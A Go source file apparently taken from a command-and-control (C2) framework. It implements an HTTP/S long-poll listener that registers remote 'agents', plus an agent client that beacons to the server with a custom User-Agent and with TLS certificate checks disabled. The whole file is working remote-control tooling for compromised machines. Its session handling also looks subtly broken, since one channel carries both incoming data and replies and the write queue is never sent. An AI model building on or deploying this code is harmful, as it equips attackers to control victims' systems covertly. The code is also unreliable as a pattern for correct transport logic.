package transport

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"
)

// HTTPListener implements a long-poll HTTP/S listener for C2.
type HTTPListener struct {
	server     *http.Server
	addr       string
	tlsConfig  *tls.Config
	messages   map[string]chan []byte
	mu         sync.RWMutex
	acceptCh   chan *httpConn
	quit       chan struct{}
}

// httpConn wraps an HTTP long-poll session as a net.Conn.
type httpConn struct {
	sessionID   string
	reader      io.Reader
	writeCh     chan []byte
	pendingRead chan []byte
	closed      bool
	mu          sync.Mutex
	localAddr   net.Addr
	remoteAddr  net.Addr
}

// NewHTTPListener creates a new HTTP long-poll listener.
func NewHTTPListener(addr string) *HTTPListener {
	return &HTTPListener{
		addr:     addr,
		messages: make(map[string]chan []byte),
		acceptCh: make(chan *httpConn, 128),
		quit:     make(chan struct{}),
	}
}

// NewHTTPSListener creates a new HTTPS long-poll listener.
func NewHTTPSListener(addr string, tlsConfig *tls.Config) *HTTPListener {
	return &HTTPListener{
		addr:      addr,
		tlsConfig: tlsConfig,
		messages:  make(map[string]chan []byte),
		acceptCh:  make(chan *httpConn, 128),
		quit:      make(chan struct{}),
	}
}

// Start begins the HTTP/S listener.
func (l *HTTPListener) Start() error {
	mux := http.NewServeMux()

	// Agent registration endpoint (POST)
	mux.HandleFunc("/register", func(w http.ResponseWriter, r *http.Request) {
		sessionID := r.Header.Get("X-Session-ID")

		body, err := io.ReadAll(r.Body)
		if err != nil || len(body) == 0 {
			http.Error(w, "bad request", 400)
			return
		}

		if sessionID == "" {
			// New session
			sessionID = fmt.Sprintf("http-%x", time.Now().UnixNano())

			conn := &httpConn{
				sessionID:   sessionID,
				writeCh:     make(chan []byte, 64),
				pendingRead: make(chan []byte, 1),
				localAddr:   addr{s: "c2-http"},
				remoteAddr:  addr{s: r.RemoteAddr},
			}

			// Queue the initial data as the first "read"
			conn.pendingRead <- body

			l.mu.Lock()
			l.messages[sessionID] = make(chan []byte, 64)
			l.mu.Unlock()

			// Signal accept
			select {
			case l.acceptCh <- conn:
			default:
				http.Error(w, "server busy", 503)
				return
			}

			w.Header().Set("X-Session-ID", sessionID)
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Cache-Control", "no-store")

			// Hold connection open for server response (long-poll)
			select {
			case resp := <-l.messages[sessionID]:
				w.Write(resp)
			case <-time.After(60 * time.Second):
				w.Write([]byte{})
			case <-r.Context().Done():
				return
			}
			return
		}

		// Existing session: queue data and respond
		l.mu.RLock()
		ch, ok := l.messages[sessionID]
		l.mu.RUnlock()

		if !ok {
			http.Error(w, "unknown session", 404)
			return
		}

		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Cache-Control", "no-store")

		// Queue incoming data
		select {
		case ch <- body:
		default:
		}

		// Wait for server response (long-poll)
		select {
		case resp := <-l.messages[sessionID]:
			w.Write(resp)
		case <-time.After(60 * time.Second):
			w.Write([]byte{})
		case <-r.Context().Done():
			return
		}
	})

	// Health check
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("ok"))
	})

	l.server = &http.Server{
		Addr:      l.addr,
		Handler:   mux,
		TLSConfig: l.tlsConfig,
	}

	go func() {
		log.Printf("[HTTP] Listening on %s (TLS: %v)", l.addr, l.tlsConfig != nil)

		var err error
		if l.tlsConfig != nil {
			err = l.server.ListenAndServeTLS("", "")
		} else {
			err = l.server.ListenAndServe()
		}

		if err != nil && err != http.ErrServerClosed {
			log.Printf("[HTTP] Error: %v", err)
		}
	}()

	return nil
}

// Accept returns the next agent connection via HTTP long-poll.
func (l *HTTPListener) Accept() (net.Conn, error) {
	select {
	case conn := <-l.acceptCh:
		return conn, nil
	case <-l.quit:
		return nil, fmt.Errorf("listener closed")
	}
}

// Close shuts down the HTTP listener.
func (l *HTTPListener) Close() error {
	close(l.quit)
	return l.server.Close()
}

// Addr returns the listener's address.
func (l *HTTPListener) Addr() net.Addr {
	return addr{s: l.addr}
}

// SendToSession sends data to a specific HTTP session.
func (l *HTTPListener) SendToSession(sessionID string, data []byte) error {
	l.mu.RLock()
	ch, ok := l.messages[sessionID]
	l.mu.RUnlock()

	if !ok {
		return fmt.Errorf("session not found: %s", sessionID)
	}

	select {
	case ch <- data:
		return nil
	case <-l.quit:
		return fmt.Errorf("listener closed")
	}
}

// --- httpConn implements net.Conn ---

func (c *httpConn) Read(b []byte) (int, error) {
	c.mu.Lock()
	defer c.mu.Unlock()

	if c.closed {
		return 0, fmt.Errorf("connection closed")
	}

	select {
	case data := <-c.pendingRead:
		n := copy(b, data)
		return n, nil
	case <-time.After(5 * time.Minute):
		return 0, fmt.Errorf("read timeout")
	}
}

func (c *httpConn) Write(b []byte) (int, error) {
	c.mu.Lock()
	defer c.mu.Unlock()

	if c.closed {
		return 0, fmt.Errorf("connection closed")
	}

	c.writeCh <- b
	return len(b), nil
}

func (c *httpConn) Close() error {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.closed = true
	close(c.writeCh)
	return nil
}

func (c *httpConn) LocalAddr() net.Addr  { return c.localAddr }
func (c *httpConn) RemoteAddr() net.Addr { return c.remoteAddr }

func (c *httpConn) SetDeadline(t time.Time) error      { return nil }
func (c *httpConn) SetReadDeadline(t time.Time) error  { return nil }
func (c *httpConn) SetWriteDeadline(t time.Time) error { return nil }

// SessionID returns the HTTP session identifier.
func (c *httpConn) SessionID() string {
	return c.sessionID
}

// GetPendingWrite returns queued server data for the HTTP response.
func (c *httpConn) GetPendingWrite() []byte {
	select {
	case data := <-c.writeCh:
		return data
	default:
		return nil
	}
}

// QueueRead queues data from an HTTP request to be read by the C2 handler.
func (c *httpConn) QueueRead(data []byte) {
	select {
	case c.pendingRead <- data:
	default:
	}
}

// --- addr helper ---

type addr struct{ s string }

func (a addr) Network() string { return "tcp" }
func (a addr) String() string  { return a.s }

// --- HTTP Transport Agent ---

// HTTPAgent connects to C2 via HTTP long-polling.
type HTTPAgent struct {
	serverURL  string
	sessionID  string
	userAgent  string
	client     *http.Client
	pollInterval time.Duration
}

// NewHTTPAgent creates a new HTTP long-poll agent transport.
func NewHTTPAgent(serverURL, userAgent string) *HTTPAgent {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	return &HTTPAgent{
		serverURL:    serverURL + "/register",
		userAgent:    userAgent,
		pollInterval: 1 * time.Second,
		client: &http.Client{
			Transport: tr,
			Timeout:   70 * time.Second,
		},
	}
}

// Send sends data via HTTP POST and returns the server response.
func (a *HTTPAgent) Send(data []byte) ([]byte, error) {
	req, err := http.NewRequest("POST", a.serverURL, bytes.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", a.userAgent)
	req.Header.Set("Cache-Control", "no-store")

	if a.sessionID != "" {
		req.Header.Set("X-Session-ID", a.sessionID)
	}

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http post: %w", err)
	}
	defer resp.Body.Close()

	if a.sessionID == "" {
		a.sessionID = resp.Header.Get("X-Session-ID")
	}

	return io.ReadAll(resp.Body)
}

// SessionID returns the current HTTP session ID.
func (a *HTTPAgent) SessionID() string {
	return a.sessionID
}

// Ensure imports used
var _ = bytes.MinRead
